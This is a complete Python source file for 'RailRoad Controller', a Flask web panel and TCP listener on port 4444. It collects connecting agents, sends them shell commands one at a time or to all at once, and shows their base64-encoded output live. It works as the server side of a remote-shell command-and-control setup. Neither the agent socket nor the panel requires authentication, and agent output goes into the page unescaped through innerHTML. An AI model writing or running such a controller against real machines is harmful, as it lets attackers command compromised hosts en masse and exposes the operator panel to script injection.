#!/usr/bin/env python3
"""
server_flask.py

Run: python3 server_flask.py
Open frontend: http://0.0.0.0:5000/
"""
import socket
import threading
import json
import base64
import uuid
import queue
import time
from flask import Flask, render_template_string, request, Response, redirect, url_for

# CONFIG
HOST = "0.0.0.0"
PORT = 4444            # TCP server port for client agents
FLASK_HOST = "0.0.0.0"
FLASK_PORT = 5000

# Shared state
clients = {}           # client_id -> dict { 'sock', 'addr', 'hostname', 'cwd', 'queue' }
clients_lock = threading.Lock()
output_events = queue.Queue()  # server -> frontend SSE

app = Flask(__name__)

# Simple HTML frontend (kept inline for brevity)
INDEX_HTML = """
<!doctype html>
<title>RailRoad Controller</title>
<h1>RailRoad Controller</h1>
<p>Clients connected: <span id="count">0</span></p>
<div>
  <h2>Clients</h2>
  <ul id="clients"></ul>
</div>

<div>
  <h2>Send Command</h2>
  <form id="cmdForm">
    <select id="clientSelect">
      <option value="__broadcast">-- Broadcast to all --</option>
    </select>
    <input id="cmdInput" placeholder='e.g. uptime or cd /tmp && ls' style="width:40%">
    <button type="submit">Send</button>
  </form>
</div>

<div>
  <h2>Output (live)</h2>
  <pre id="output" style="height:400px;overflow:auto;background:#111;color:#eee;padding:10px"></pre>
</div>

<script>
const evtSource = new EventSource("/stream");
evtSource.onmessage = function(e) {
  const data = JSON.parse(e.data);
  const out = document.getElementById("output");
  const clients = document.getElementById("clients");
  const count = document.getElementById("count");
  // Update clients list
  if (data.type === "clients") {
    // rebuild client list
    const list = data.clients;
    const select = document.getElementById("clientSelect");
    select.innerHTML = '<option value="__broadcast">-- Broadcast to all --</option>';
    clients.innerHTML = '';
    for (const c of list) {
      const li = document.createElement('li');
      li.textContent = `${c.client_id} — ${c.hostname} — ${c.addr} — cwd:${c.cwd}`;
      clients.appendChild(li);
      const opt = document.createElement('option');
      opt.value = c.client_id;
      opt.text = `${c.hostname} (${c.client_id})`;
      select.appendChild(opt);
    }
    count.textContent = list.length;
  }
  // Output messages
  if (data.type === "output") {
    const t = document.createElement('div');
    t.innerHTML = `<b>[${data.client_id} | ${data.hostname} | ${data.cwd}]</b>\n<pre>${data.text}</pre>\n<hr/>`;
    out.prepend(t);
  }
  if (data.type === "info") {
    const t = document.createElement('div');
    t.textContent = `[INFO] ${data.msg}`;
    out.prepend(t);
  }
};

document.getElementById('cmdForm').onsubmit = async (e) => {
  e.preventDefault();
  const client = document.getElementById('clientSelect').value;
  const cmd = document.getElementById('cmdInput').value.trim();
  if (!cmd) return;
  const resp = await fetch('/send', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({client, cmd})
  });
  document.getElementById('cmdInput').value = '';
};
</script>
"""

########################
# TCP Server Components
########################

def send_json(sock, obj):
    """Send newline-delimited JSON."""
    data = (json.dumps(obj) + "\n").encode()
    sock.sendall(data)

def client_reader_thread(client_id):
    """Listens for incoming messages from a particular client socket."""
    with clients_lock:
        entry = clients.get(client_id)
    if not entry:
        return
    sock = entry['sock']
    addr = entry['addr']
    buffer = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buffer += chunk
            while b"\n" in buffer:
                line, _, buffer = buffer.partition(b"\n")
                try:
                    msg = json.loads(line.decode())
                except Exception:
                    continue
                handle_client_message(client_id, msg)
    except Exception as e:
        pass
    finally:
        with clients_lock:
            clients.pop(client_id, None)
        output_events.put({"type":"info","msg":f"client {client_id} disconnected"})
        broadcast_clients_state()

def handle_client_message(client_id, msg):
    """
    Expected message types from client:
     - { "type":"register", "hostname":"...", "cwd":"..." }
     - { "type":"output", "output":"base64...", "cwd":"..." }
    """
    mtype = msg.get("type")
    if mtype == "register":
        with clients_lock:
            if client_id in clients:
                clients[client_id].update({
                    'hostname': msg.get('hostname'),
                    'cwd': msg.get('cwd', clients[client_id].get('cwd'))
                })
        broadcast_clients_state()
        output_events.put({"type":"info","msg":f"client {client_id} registered: {msg.get('hostname')}"})
    elif mtype == "output":
        b64 = msg.get("output", "")
        try:
            raw = base64.b64decode(b64)
            text = raw.decode(errors="replace")
        except Exception:
            text = "[decode error]"
        hostname = msg.get("hostname", "")
        cwd = msg.get("cwd", "")
        output_events.put({"type":"output","client_id": client_id, "hostname": hostname, "cwd": cwd, "text": text})
    elif mtype == "ping":
        # ignore or update heartbeat
        with clients_lock:
            if client_id in clients:
                clients[client_id]['last_seen'] = time.time()
    else:
        output_events.put({"type":"info","msg":f"unknown msg from {client_id}: {msg}"})

def broadcast_clients_state():
    """Put clients list into the SSE queue so frontend updates."""
    with clients_lock:
        lst = []
        for cid, e in clients.items():
            lst.append({
                "client_id": cid,
                "hostname": e.get('hostname',''),
                "addr": f"{e['addr'][0]}:{e['addr'][1]}",
                "cwd": e.get('cwd','')
            })
    output_events.put({"type":"clients", "clients": lst})

def tcp_accept_loop():
    """Accept loop for incoming client connections."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(5)
    print(f"TCP server listening on {HOST}:{PORT}")
    while True:
        conn, addr = srv.accept()
        # create client id
        client_id = str(uuid.uuid4())[:8]
        entry = {
            'sock': conn,
            'addr': addr,
            'hostname': '',
            'cwd': '',
            'queue': queue.Queue(),
            'last_seen': time.time()
        }
        with clients_lock:
            clients[client_id] = entry
        # spawn a thread to read from client
        t = threading.Thread(target=client_reader_thread, args=(client_id,), daemon=True)
        t.start()
        # spawn a thread to write to client from its queue
        w = threading.Thread(target=client_writer_thread, args=(client_id,), daemon=True)
        w.start()
        output_events.put({"type":"info","msg":f"client connected {client_id} from {addr}"})
        broadcast_clients_state()

def client_writer_thread(client_id):
    """Send queued commands to client."""
    while True:
        with clients_lock:
            entry = clients.get(client_id)
        if not entry:
            break
        try:
            cmd = entry['queue'].get()  # blocks
            sock = entry['sock']
            send_json(sock, cmd)
        except Exception:
            break

####################
# Flask Endpoints
####################

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/send", methods=["POST"])
def send_cmd():
    """
    JSON: { "client": "<client_id> or __broadcast", "cmd": "ls -la" }
    """
    data = request.get_json()
    client = data.get('client')
    cmd = data.get('cmd','')
    if not cmd:
        return {"ok": False, "error": "empty command"}, 400

    sent_to = []
    with clients_lock:
        if client == "__broadcast":
            for cid, entry in clients.items():
                entry['queue'].put({"type":"cmd","cmd": cmd})
                sent_to.append(cid)
        else:
            entry = clients.get(client)
            if not entry:
                return {"ok": False, "error": "client not found"}, 404
            entry['queue'].put({"type":"cmd","cmd": cmd})
            sent_to.append(client)

    output_events.put({"type":"info","msg":f"sent command to: {', '.join(sent_to)}"})
    return {"ok": True, "sent": sent_to}

@app.route("/stream")
def stream():
    def event_stream():
        # Send initial clients state
        broadcast_clients_state()
        while True:
            try:
                ev = output_events.get()
                yield f"data: {json.dumps(ev)}\n\n"
            except GeneratorExit:
                break
    return Response(event_stream(), mimetype="text/event-stream")

####################
# Runner
####################

if __name__ == "__main__":
    # start TCP acceptor
    t = threading.Thread(target=tcp_accept_loop, daemon=True)
    t.start()
    # start flask
    app.run(host=FLASK_HOST, port=FLASK_PORT, threaded=True)
